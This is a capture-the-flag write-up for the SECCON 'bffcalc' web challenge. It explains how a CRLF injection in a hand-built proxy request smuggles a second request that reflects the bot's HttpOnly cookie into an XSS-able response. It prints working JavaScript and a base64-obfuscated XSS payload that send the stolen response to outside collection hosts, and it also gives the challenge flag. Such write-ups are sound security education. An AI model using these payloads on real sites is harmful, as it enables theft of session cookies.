# bffcalc

Description: There is a simple calculator!

---

## The target

The target application was evaluating our code if it matched this very strict allowlist: `ALLOWED_CHARS = "0123456789+-*/ "`. 
```py
import cherrypy


class Root(object):
    ALLOWED_CHARS = "0123456789+-*/ "

    @cherrypy.expose
    def default(self, *args, **kwargs):
        print(self, args, kwargs)
        expr = str(kwargs.get("expr", 42))
        if len(expr) < 50 and all(c in self.ALLOWED_CHARS for c in expr):
            return str(eval(expr))
        return expr


cherrypy.config.update({"engine.autoreload.on": False})
cherrypy.server.unsubscribe()
cherrypy.engine.start()
app = cherrypy.tree.mount(Root())
```

Otherwise, our expression was reflected back with `text/html` content-type which gave us a free XSS.

There were 5 containers in this task:
* `nginx` - reverse proxy which would forward the traffic either to `bff` or to `report` container
* `bff` - simple cherrypy web application which would respond with all the HTMLs and forward our expressions to `backend`
* `backend` - a cherrypy web application which would evaluate our expressions
* `report` - a Node.js app that would forward the URLs to visit to the `bot` container
* `bot` - which suggested a client-side exploit

The flag was inside bot's cookie so our task was to:
1. Prepare an expression that would force bot's cookie to be present in the response
2. Read and exfiltrate the response

While the latter is pretty easy, provided we have a free XSS. It's the first point that was the challenge.

## The flow

The expression was distributed from `nginx` to `bff` to `backend`. 

The request from `backend` to `bff` was constucted on raw socket which was just too simple to be robust:

```py
def proxy(req) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("backend", 3000))
    sock.settimeout(1)

    payload = ""
    method = req.method
    path = req.path_info
    if req.query_string:
        path += "?" + req.query_string
    payload += f"{method} {path} HTTP/1.1\r\n"
    for k, v in req.headers.items():
        payload += f"{k}: {v}\r\n"
    payload += "\r\n"
    with open('/app/mylog.txt', 'a') as logfile:
        logfile.write(f'\n\n{payload}')

    sock.send(payload.encode())
    time.sleep(.3)
    try:
        data = sock.recv(4096)
        body = data.split(b"\r\n\r\n", 1)[1].decode()
    except (IndexError, TimeoutError) as e:
        print(e)
        body = str(e)
    return body
```

## CRLF

Indeed, there was CRLF injection in the request path. If we sent a request like this:

```
POST /api%20HTTP/1.1%0d%0aHost:whatever%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:260%0d%0aConnection:close%0d%0a%0d%0aexpr= HTTP/1.1
Host: bffcalc.seccon.games:3000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Content-Length: 0
Connection: close

```

Where the path after URL-decoding is:

```
/api HTTP/1.1
Host:whatever
Content-Type:application/x-www-form-urlencoded
Content-Length:260
Connection:close

expr=
```

Then 255 characters following the path in the original request would be understood by the server as the part of the `expr` parameter and thus reflected in the response. 

```
HTTP/1.1 200 OK
Server: nginx/1.23.2
Date: Sat, 12 Nov 2022 12:20:27 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 255
Connection: close
Via: waitress

 HTTP/1.1
Remote-Addr: 172.18.0.6
Remote-Host: 172.18.0.6
Connection: upgrade
Host: bffcalc.seccon.games
X-Real-Ip: 80.82.28.18
X-Forwarded-For: 80.82.28.18
X-Forwarded-Proto: http
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requ
```

We can exfiltrate this using the following JS:

```js
var xhr = new XMLHttpRequest(); 
xhr.open("POST", "http://nginx:3000/%20HTTP/1.1%0d%0aHost:whatever%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:460%0d%0aConnection:keep-alive%0d%0a%0d%0aexpr=", true); 
xhr.withCredentials = true; 
xhr.onreadystatechange = () => {
    navigator.sendBeacon("http://wnnyfbre9v804argec3hmvteh5nwbnzc.oastify.com/", xhr.response) 
}; 
xhr.send();
```

## Problematic semicolons

However, the problem was that the request body also included some ; which are treated by the cherrypy as the parameter separator.

The semicolon in the `User-agent` header would terminate our `expr` parameter. Because the `Cookie` header was after the `User-agent`, it didn't make it into the response. To make the cookie part of the `expr`, we had to inject another `expr=` somewhere between a semicolon and the cookie header. Semicolons were also inside `Accept-*` headers. 

We injected it inside the `Referer` header:
```js
fetch(
  'http://nginx:3000/api%20HTTP/1.1%0d%0aHost:whatever%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:510%0d%0aConnection:close%0d%0a%0d%0a',
  {
    method: 'POST',
    referrer: 'http://nginx:3000/api?;expr=1',
    credentials: 'include',
    headers: { 'Accept-Language': 'null', 'Accept-Encoding': 'gzip' },
  }
)
  .then((e) => e.text())
  .then(
    (e) =>
      console.log(e) ||
      navigator.sendBeacon(
        'https://webhook.site/889b2f97-a60a-486a-aa85-628d0153150b',
        e
      )
  )

```

Final payload
```HTML
<style/onload=eval(atob('ZmV0Y2goJ2h0dHA6Ly9uZ2lueDozMDAwL2FwaSUyMEhUVFAvMS4xJTBkJTBhSG9zdDp3aGF0ZXZlciUwZCUwYUNvbnRlbnQtVHlwZTphcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQlMGQlMGFDb250ZW50LUxlbmd0aDo1MTAlMGQlMGFDb25uZWN0aW9uOmNsb3NlJTBkJTBhJTBkJTBhJywge21ldGhvZDogJ1BPU1QnLCByZWZlcnJlcjogJ2h0dHA6Ly9uZ2lueDozMDAwL2FwaT87ZXhwcj0xJywgY3JlZGVudGlhbHM6ICdpbmNsdWRlJywgaGVhZGVyczogeydBY2NlcHQtTGFuZ3VhZ2UnOiAnbnVsbCcsICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCd9fSkudGhlbihlPT5lLnRleHQoKSkudGhlbihlPT5jb25zb2xlLmxvZyhlKXx8bmF2aWdhdG9yLnNlbmRCZWFjb24oJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzg4OWIyZjk3LWE2MGEtNDg2YS1hYTg1LTYyOGQwMTUzMTUwYicsIGUpKQ=='))>
```

Flag:
```
SECCON{i5_1t_p0ssible_tO_s7eal_http_only_cooki3_fr0m_XSS}
```